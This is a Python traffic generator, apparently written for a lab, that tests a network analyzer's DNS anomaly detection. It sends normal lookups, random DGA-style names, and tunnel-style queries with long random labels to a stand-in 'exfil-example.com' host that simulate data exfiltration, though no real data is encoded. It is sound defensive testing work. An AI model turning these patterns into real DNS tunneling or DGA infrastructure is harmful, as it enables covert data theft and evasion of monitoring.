#!/usr/bin/env python3
"""
generate_dns.py - DNS Traffic Generator
-----------------------------------------
Generates DNS query traffic for testing the analyzer's DNS parsing
and anomaly detection capabilities.

Three modes:
  --normal  : Send DNS queries for legitimate well-known domains
  --dga     : Send queries for randomly generated high-entropy names
              that simulate domain generation algorithm (DGA) behavior
  --tunnel  : Send queries with unusually long subdomain labels that
              simulate DNS tunneling attempts

Usage:
    python3 generate_dns.py --normal
    python3 generate_dns.py --dga -c 10
    python3 generate_dns.py --tunnel

Note: This script uses the system resolver via socket, not raw packets,
so it does not require sudo. The analyzer will see the DNS queries
on the network interface regardless.
"""

import argparse
import random
import socket
import string
import time


# Normal domains for baseline traffic
NORMAL_DOMAINS = [
    "google.com",
    "github.com",
    "stackoverflow.com",
    "wikipedia.org",
    "python.org",
    "cloudflare.com",
    "amazon.com",
    "bowie.edu",
]

# Simulated DGA-style names: high entropy, random-looking subdomains
def generate_dga_domain(length=16) -> str:
    """Generate a pseudo-random domain name resembling DGA output."""
    chars = string.ascii_lowercase + string.digits
    subdomain = "".join(random.choices(chars, k=length))
    tld = random.choice(["com", "net", "org", "info"])
    return f"{subdomain}.{tld}"


def generate_tunnel_domain() -> str:
    """Generate a domain with a very long subdomain simulating DNS tunneling."""
    # DNS tunneling often encodes data in long subdomain labels
    payload = "".join(random.choices(string.ascii_lowercase + string.digits, k=40))
    return f"{payload}.data.exfil-example.com"


def resolve(domain: str):
    """Attempt to resolve a domain. Failure is expected for fake domains."""
    try:
        result = socket.gethostbyname(domain)
        print(f"    DNS query: {domain} -> {result}")
    except socket.gaierror:
        print(f"    DNS query: {domain} -> NXDOMAIN (expected for test domains)")


def send_normal(count: int, interval: float):
    """Send DNS queries for legitimate domains."""
    print(f"[*] Sending {count} normal DNS queries for baseline traffic.\n")
    domains = (NORMAL_DOMAINS * ((count // len(NORMAL_DOMAINS)) + 1))[:count]
    for domain in domains:
        resolve(domain)
        time.sleep(interval)
    print(f"\n[*] Done. {count} normal DNS queries sent.")


def send_dga(count: int, interval: float):
    """Send DNS queries for DGA-style high-entropy domain names."""
    print(f"[*] Sending {count} DGA-style DNS queries.")
    print(f"    These have high subdomain entropy and will trigger DNS alerts.\n")
    for i in range(count):
        domain = generate_dga_domain()
        resolve(domain)
        time.sleep(interval)
    print(f"\n[*] Done. {count} DGA-style DNS queries sent.")
    print(f"    The analyzer should flag these based on entropy and name length.")


def send_tunnel(count: int, interval: float):
    """Send DNS queries with very long subdomains simulating tunneling."""
    print(f"[*] Sending {count} DNS tunnel-style queries.")
    print(f"    These use long subdomain labels to simulate data exfiltration.\n")
    for i in range(count):
        domain = generate_tunnel_domain()
        resolve(domain)
        time.sleep(interval)
    print(f"\n[*] Done. {count} tunnel-style DNS queries sent.")
    print(f"    The analyzer should flag these based on name length.")


def parse_args():
    parser = argparse.ArgumentParser(
        description="DNS traffic generator for lab testing."
    )
    parser.add_argument("-c", "--count", type=int, default=10,
                        help="Number of queries to send. Default: 10.")
    parser.add_argument("--interval", type=float, default=0.3,
                        help="Seconds between queries. Default: 0.3.")
    parser.add_argument("--normal", action="store_true",
                        help="Send normal DNS queries for baseline traffic.")
    parser.add_argument("--dga", action="store_true",
                        help="Send high-entropy DGA-style queries.")
    parser.add_argument("--tunnel", action="store_true",
                        help="Send long-subdomain tunnel-style queries.")
    return parser.parse_args()


def main():
    args = parse_args()

    if not args.normal and not args.dga and not args.tunnel:
        print("[!] Specify at least one mode: --normal, --dga, or --tunnel.")
        return

    if args.normal:
        send_normal(args.count, args.interval)
    if args.dga:
        send_dga(args.count, args.interval)
    if args.tunnel:
        send_tunnel(args.count, args.interval)


if __name__ == "__main__":
    main()
